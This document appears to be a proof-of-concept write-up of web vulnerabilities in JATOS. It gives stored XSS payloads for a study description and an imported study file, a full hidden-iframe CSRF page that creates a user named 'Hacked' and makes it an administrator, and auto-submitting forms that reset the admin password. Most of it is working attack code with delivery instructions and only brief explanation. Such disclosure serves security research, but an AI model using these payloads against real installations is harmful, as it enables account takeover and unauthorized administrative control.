## First | Stored XSS - Description

```
<script>alert(1)</script>
```

----------------------------------------------------------------------------------------

## Second | Stored XSS - Importing Study

```
{"version":"3","data":{"uuid":"UUID NUMBER","title":"testing","description":"","groupStudy":false,"linearStudy":false,"allowPreview":true,"dirName":"admin","comments":"","jsonData":null,"endRedirectUrl":"","studyEntryMsg":"hi guys","componentList":[],"batchList":[{"uuid":"12345","title":"Default","active":true,"maxActiveMembers":null,"maxTotalMembers":null,"maxTotalWorkers":null,"allowedWorkerTypes":["PersonalSingle","Jatos","PersonalMultiple"],"comments":null,"jsonData":null}]}}

----------------------------------------------------------------------------------

{"version":"3","data":{"uuid":"<script>alert(1)</script>","title":"testing","description":"","groupStudy":false,"linearStudy":false,"allowPreview":true,"dirName":"admin","comments":"","jsonData":null,"endRedirectUrl":"","studyEntryMsg":"hi guys","componentList":[],"batchList":[{"uuid":"12345","title":"Default","active":true,"maxActiveMembers":null,"maxTotalMembers":null,"maxTotalWorkers":null,"allowedWorkerTypes":["PersonalSingle","Jatos","PersonalMultiple"],"comments":null,"jsonData":null}]}}
```

---

## Third | CSRF - Create Admin User (XSS from HTML file)

In this example, we exploit the vulnerability to create new users with administrative privileges by combining an XSS flaw with the lack of CSRF protection. An attacker can inject malicious JavaScript into an uploaded HTML file and deliver a link to the administrator. When the administrator accesses the link, the script executes, creating new admin users. This demonstrates the critical need for CSRF tokens to secure administrative actions.

Even if all XSS vulnerabilities are patched, allowing users to upload HTML files still poses a risk. Users can directly embed JavaScript in these files, which, if misused, can lead to account takeovers and other exploits. The core issue isn't just executing JavaScript but the absence of CSRF protection. Without CSRF tokens, attackers can leverage uploaded files to perform unauthorized actions, such as creating new admin users or changing passwords. Proper CSRF protection is vital to prevent these attacks.

HTML file
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Post Request via iframe</title>
</head>
<body>
  <iframe name="postIframe" style="display:none;"></iframe>
  <iframe name="postIframetimeout" style="display:none;"></iframe>

  <script>
    function postRequestInIframe() {
      var form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://localhost:9000/jatos/user';
      form.target = 'postIframe';

      var usernameInput = document.createElement('input');
      usernameInput.type = 'hidden';
      usernameInput.name = 'username';
      usernameInput.value = 'Hacked';
      form.appendChild(usernameInput);

      var nameInput = document.createElement('input');
      nameInput.type = 'hidden';
      nameInput.name = 'name';
      nameInput.value = 'name123';
      form.appendChild(nameInput);

      var emailInput = document.createElement('input');
      emailInput.type = 'hidden';
      emailInput.name = 'email';
      emailInput.value = 'email@gmail.com';
      form.appendChild(emailInput);

      var authByLdapInput = document.createElement('input');
      authByLdapInput.type = 'hidden';
      authByLdapInput.name = 'authByLdap';
      authByLdapInput.value = 'false';
      form.appendChild(authByLdapInput);

      var passwordInput = document.createElement('input');
      passwordInput.type = 'hidden';
      passwordInput.name = 'password';
      passwordInput.value = 'password123';
      form.appendChild(passwordInput);

      document.body.appendChild(form);
      form.submit();

      document.body.removeChild(form);
    }

    // Trigger the first request immediately
    postRequestInIframe();

    // Wait 3 seconds and trigger the second request
    setTimeout(function postRequestInIframeaftertimeout() {
      var form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://localhost:9000/jatos/user/hacked/properties/role?role=ADMIN&value=true';
      form.target = 'postIframetimeout';

      document.body.appendChild(form);
      form.submit();

      document.body.removeChild(form);
    }, 3000); // Executes after 3000ms (5 seconds)
  </script>
</body>
</html>
```

Make 2 POST requests (Use the link generator to deliver the payload)
- Create User: Hacked
- Give the user "Hacked" admin right

---

## Fourth | CSRF - Reset Admin Password (XSS from HTML file)

```
<form action='http://localhost.com:9000/jatos/user/passwordByAdmin' method='POST'>
    <input type='hidden' name='newPassword' value='adminadmin'>
    <input type='hidden' name='username' value='admin'>
    <button type='submit'>Submit</button>
</form>

---------------------------------------------------------------------------------

<form action='http://localhost:9000/jatos/user/passwordByAdmin' method='POST'>
    <input type='hidden' name='newPassword' value='adminadminadmin'>
    <input type='hidden' name='username' value='admin'>
    <button id='submitButton' type='submit' style='display:none;'>Submit</button>
    <script>
        setTimeout(function() {
            document.getElementById('submitButton').click();
        }, 3000); // 3000 milliseconds = 3 seconds
    </script>
</form>
```

Make 1 POST requests (Use the link generator to deliver the payload)
- Reset Admin Password
